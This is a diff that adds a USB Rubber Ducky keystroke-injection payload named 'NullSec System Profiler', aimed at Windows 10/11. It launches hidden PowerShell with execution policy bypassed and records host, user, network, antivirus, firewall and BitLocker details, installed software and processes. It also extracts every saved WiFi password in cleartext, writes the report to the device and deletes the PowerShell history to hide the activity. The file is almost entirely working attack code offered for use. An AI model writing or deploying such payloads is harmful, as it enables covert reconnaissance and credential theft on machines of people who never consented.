@@ -1,0 +1,148 @@
+REM ====================================================
+REM Title:         NullSec System Profiler
+REM Author:        NullSec (bad-antics)
+REM Description:   Comprehensive system reconnaissance
+REM                Collects hardware, software, network,
+REM                and security configuration details.
+REM                Saves report to Ducky mass storage.
+REM Target:        Windows 10/11
+REM Version:       1.0
+REM Category:      Recon
+REM ====================================================
+
+DELAY 1000
+REM Open PowerShell hidden
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
+ENTER
+DELAY 1500
+
+REM Find the Ducky drive
+STRING $d=(Get-CimInstance Win32_LogicalDisk|?{$_.VolumeName -eq 'DUCKY'}).DeviceID;if(!$d){$d=$env:TEMP}
+ENTER
+DELAY 300
+
+REM Build comprehensive report
+STRING $r=@();$r+="=== NULLSEC SYSTEM PROFILER ==="
+ENTER
+DELAY 100
+STRING $r+="Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+ENTER
+DELAY 100
+STRING $r+="Hostname: $env:COMPUTERNAME"
+ENTER
+DELAY 100
+STRING $r+="Username: $env:USERNAME"
+ENTER
+DELAY 100
+STRING $r+="Domain: $env:USERDOMAIN"
+ENTER
+DELAY 100
+
+REM OS Information
+STRING $r+="`n=== OPERATING SYSTEM ==="
+ENTER
+DELAY 100
+STRING $os=Get-CimInstance Win32_OperatingSystem;$r+="OS: $($os.Caption) $($os.Version)"
+ENTER
+DELAY 100
+STRING $r+="Build: $($os.BuildNumber) | Arch: $($os.OSArchitecture)"
+ENTER
+DELAY 100
+STRING $r+="Install Date: $($os.InstallDate)"
+ENTER
+DELAY 100
+STRING $r+="Last Boot: $($os.LastBootUpTime)"
+ENTER
+DELAY 100
+
+REM Hardware
+STRING $r+="`n=== HARDWARE ==="
+ENTER
+DELAY 100
+STRING $cpu=Get-CimInstance Win32_Processor;$r+="CPU: $($cpu.Name) ($($cpu.NumberOfCores) cores)"
+ENTER
+DELAY 200
+STRING $ram=Get-CimInstance Win32_PhysicalMemory|Measure-Object -Property Capacity -Sum;$r+="RAM: $([math]::Round($ram.Sum/1GB,2)) GB"
+ENTER
+DELAY 200
+STRING Get-CimInstance Win32_DiskDrive|%{$r+="Disk: $($_.Model) - $([math]::Round($_.Size/1GB,1)) GB"}
+ENTER
+DELAY 200
+STRING $gpu=Get-CimInstance Win32_VideoController;$r+="GPU: $($gpu.Name)"
+ENTER
+DELAY 200
+
+REM Network
+STRING $r+="`n=== NETWORK ==="
+ENTER
+DELAY 100
+STRING Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress -ne '127.0.0.1'}|%{$r+="IP: $($_.IPAddress)/$($_.PrefixLength) ($($_.InterfaceAlias))"}
+ENTER
+DELAY 300
+STRING $r+="Gateway: $((Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop)"
+ENTER
+DELAY 200
+STRING $dns=Get-DnsClientServerAddress -AddressFamily IPv4|Select-Object -ExpandProperty ServerAddresses -Unique;$r+="DNS: $($dns -join ', ')"
+ENTER
+DELAY 200
+STRING $r+="Public IP: $((Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content)"
+ENTER
+DELAY 500
+
+REM WiFi Profiles
+STRING $r+="`n=== WIFI PROFILES ==="
+ENTER
+DELAY 100
+STRING $profiles=netsh wlan show profiles|Select-String 'All User Profile'|%{($_ -split ':')[1].Trim()};$r+="Saved Networks: $($profiles.Count)"
+ENTER
+DELAY 300
+STRING foreach($p in $profiles){try{$key=netsh wlan show profile name="$p" key=clear|Select-String 'Key Content'|%{($_ -split ':')[1].Trim()};$r+="  $p : $key"}catch{}}
+ENTER
+DELAY 1000
+
+REM Security
+STRING $r+="`n=== SECURITY ==="
+ENTER
+DELAY 100
+STRING $av=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue;$r+="AV: $($av.displayName -join ', ')"
+ENTER
+DELAY 200
+STRING $fw=Get-NetFirewallProfile|%{"$($_.Name):$($_.Enabled)"};$r+="Firewall: $($fw -join ', ')"
+ENTER
+DELAY 200
+STRING $r+="UAC: $((Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA)"
+ENTER
+DELAY 200
+STRING $r+="BitLocker: $((Get-BitLockerVolume -MountPoint C: -ErrorAction SilentlyContinue).ProtectionStatus)"
+ENTER
+DELAY 200
+
+REM Installed Software
+STRING $r+="`n=== INSTALLED SOFTWARE (Top 30) ==="
+ENTER
+DELAY 100
+STRING Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Sort-Object InstallDate -Descending|Select-Object -First 30|%{$r+="  $($_.DisplayName) v$($_.DisplayVersion)"}
+ENTER
+DELAY 500
+
+REM Running Processes
+STRING $r+="`n=== TOP PROCESSES (by memory) ==="
+ENTER
+DELAY 100
+STRING Get-Process|Sort-Object WorkingSet64 -Descending|Select-Object -First 15|%{$r+="  $($_.ProcessName) - $([math]::Round($_.WorkingSet64/1MB,1)) MB (PID: $($_.Id))"}
+ENTER
+DELAY 300
+
+REM Save report
+STRING $r+= "`n=== END REPORT ==="
+ENTER
+DELAY 100
+STRING $r -join "`n"|Out-File "$d\system_profile_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" -Encoding UTF8
+ENTER
+DELAY 500
+
+REM Clean up
+STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue;exit
+ENTER
